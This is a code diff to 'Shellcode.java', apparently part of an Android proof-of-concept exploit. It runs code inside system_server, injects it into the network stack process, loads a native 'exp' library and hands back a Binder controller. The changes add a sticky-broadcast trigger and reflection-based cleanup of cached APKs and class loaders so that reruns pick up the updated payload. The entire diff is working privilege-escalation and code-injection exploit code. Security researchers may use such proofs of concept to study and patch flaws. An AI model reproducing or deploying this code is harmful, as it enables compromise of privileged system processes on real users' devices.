@@ -8,10 +8,13 @@ import android.app.IApplicationThread;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
+import android.content.IntentFilter;
 import android.content.pm.ActivityInfo;
 import android.content.pm.ApplicationInfo;
 import android.os.Binder;
 import android.os.Bundle;
+import android.os.Handler;
+import android.os.Looper;
 import android.os.Parcel;
 import android.os.Process;
 import android.os.RemoteException;
@@ -31,18 +34,24 @@ public class Shellcode extends BroadcastReceiver {
         Log.e(TAG, "Shell code has been executed in " + uid + " process " + processName);
         if (uid == Process.SYSTEM_UID) {
             // In system_server
-            stage1();
+            Context context = ActivityThread.currentApplication();
+            Intent intent = context.registerReceiver(null, new IntentFilter(TAG));
+            if (intent != null) {
+                context.removeStickyBroadcast(intent);
+                stage1(context);
+            }
+            // Defer cleanup for 1s as the system might be keep trying to load the package
+            new Handler(Looper.getMainLooper()).postDelayed(Shellcode::cleanupLoadedApk, 1000);
         }
     }
 
     /**
      * To be executed in system_process process, to inject code into network stack
      */
-    private static void stage1() {
+    private static void stage1(Context context) {
         try {
             Log.e(TAG, "in system server, stage 1");
-            ApplicationInfo appInfo = ActivityThread.currentApplication()
-                    .getPackageManager()
+            ApplicationInfo appInfo = context.getPackageManager()
                     .getApplicationInfo(BuildConfig.APPLICATION_ID, 0);
             ActivityInfo receiverInfo = new ActivityInfo();
             receiverInfo.applicationInfo = appInfo;
@@ -76,6 +85,13 @@ public class Shellcode extends BroadcastReceiver {
      */
     private static void stage2(Context context) {
         Log.e(TAG, "in network stack, stage 2");
+//        Runtime runtime = Runtime.getRuntime();
+//        runtime.gc();
+//        runtime.runFinalization();
+//        runtime.gc();
+        // FIXME This can throw UnsatisfiedLinkError if so already opened by other class loaders
+        //  Remove cleanupLoadedApk call fixes it but updated apk won't be loaded
+        //  Workaround: Always update PoC app when rerun is needed
         System.loadLibrary("exp");
         var controller = new Binder() {
             @Override
@@ -117,15 +133,12 @@ public class Shellcode extends BroadcastReceiver {
         Log.d(TAG, "controller sent");
     }
 
-    @Override public void onReceive(Context context, Intent intent) {
-        // In network stack
+    /**
+     * Cleanup cached loaded apk & class loader so next run will correctly use updated apk
+     */
+    private static void cleanupLoadedApk() {
         try {
-            stage2(context);
-        } catch (Throwable t) {
-            Log.e(TAG, "handle receive", t);
-        }
-        // Cleanup cached class loader so next run will correctly use updated apk
-        try {
+            Log.e(TAG, "Cleanup loaded apk");
             ActivityThread activityThread = ActivityThread.currentActivityThread();
             @SuppressLint("SoonBlockedPrivateApi")
             Field mResourcesManager = ActivityThread.class.getDeclaredField("mResourcesManager");
@@ -147,7 +160,7 @@ public class Shellcode extends BroadcastReceiver {
                 cachedApplications.remove(BuildConfig.APPLICATION_ID);
             }
 
-            ClassLoader classLoader = context.getClassLoader();
+            ClassLoader classLoader = Shellcode.class.getClassLoader();
             Field mLoaders = ApplicationLoaders.class.getDeclaredField("mLoaders");
             mLoaders.setAccessible(true);
             ArrayMap<String, ClassLoader> cachedClassLoaders = (ArrayMap<String, ClassLoader>) mLoaders.get(ApplicationLoaders.getDefault());
@@ -160,5 +173,15 @@ public class Shellcode extends BroadcastReceiver {
         } catch (Exception e) {
             Log.e(TAG, "Failed to cleanup loaded apk", e);
         }
+    }
+
+    @Override public void onReceive(Context context, Intent intent) {
+        // In network stack
+        try {
+            stage2(context);
+        } catch (Throwable t) {
+            Log.e(TAG, "handle receive", t);
+        }
+        cleanupLoadedApk();
     }
 }
